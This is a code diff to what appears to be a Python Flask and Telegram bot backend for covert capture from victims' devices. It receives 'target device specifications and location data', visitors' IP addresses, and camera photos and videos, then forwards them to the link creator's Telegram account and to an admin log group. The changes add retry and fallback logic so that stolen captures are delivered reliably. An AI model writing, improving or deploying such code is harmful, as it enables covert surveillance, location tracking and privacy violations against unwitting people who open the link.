@@ -10,8 +10,8 @@ GROUP_ID = os.environ.get('GROUP_ID') # Your Master Log Group ID
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# In-memory storage for logs and user preferences
-# collection stores: { "session_id": {"photos": [], "info": "...", "creator": "..."} }
+# In-memory storage for logs and user sessions
+# collection stores: { "session_key": {"photos": [], "info": "...", "creator": "..."} }
 collection = {}
 user_temp = {}
 
@@ -96,7 +96,7 @@ def index():
 def log_info():
     """Receives target device specifications and location data."""
     data = request.json
-    tid = request.args.get('id') # The Creator's Telegram ID
+    tid = request.args.get('id')
     ip = data.get('ip', request.remote_addr)
     
     # Unique key to link log_info with the incoming photos
@@ -114,7 +114,7 @@ def log_info():
         f"━━━━━━━━━━━━━━━"
     )
     
-    # Save target info in memory
+    # Initialize session or update existing one with the data
     if session_key not in collection:
         collection[session_key] = {"photos": [], "creator": tid}
     
@@ -130,22 +130,30 @@ def upload():
     
     file_bytes = request.files['file'].read()
     
-    # Ensure a session exists even if log_info was slow
+    # --- SMART SYNC LOGIC ---
+    # If log_info hasn't arrived, wait and check 5 times (1 second apart)
+    retries = 0
+    while session_key not in collection or "info" not in collection[session_key]:
+        if retries >= 5:
+            break
+        time.sleep(1)
+        retries += 1
+
+    # Fallback if log_info STILL hasn't arrived after 5 seconds
     if session_key not in collection:
         collection[session_key] = {
             "photos": [], 
-            "info": f"⚠️ <b>Fast Capture (No Logs)</b>\nID: {tid}\nIP: {ip}", 
+            "info": f"⚠️ <b>Fast Capture (Logs Delayed)</b>\nID: {tid}\nIP: {ip}", 
             "creator": tid
         }
     
     session = collection[session_key]
-    info = session.get("info")
+    info = session.get("info", f"ID: {tid}\nIP: {ip}")
 
     # 1. Video Capture Handler
     if request.args.get('type') == 'video':
         try:
-            video_io = io.BytesIO(file_bytes)
-            bot.send_video(tid, video_io, caption=info, parse_mode="HTML")
+            bot.send_video(tid, io.BytesIO(file_bytes), caption=info, parse_mode="HTML")
             if GROUP_ID:
                 bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=f"Admin Log:\n{info}", parse_mode="HTML")
         except: pass
@@ -169,8 +177,8 @@ def upload():
             if GROUP_ID:
                 bot.send_media_group(GROUP_ID, media)
             
-            # Wipe memory for this session
-            del collection[session_key]
+            # Wipe photos but keep key briefly to avoid race conditions with stray uploads
+            session["photos"] = []
         except Exception as e:
             print(f"Deployment Error: {e}")
             
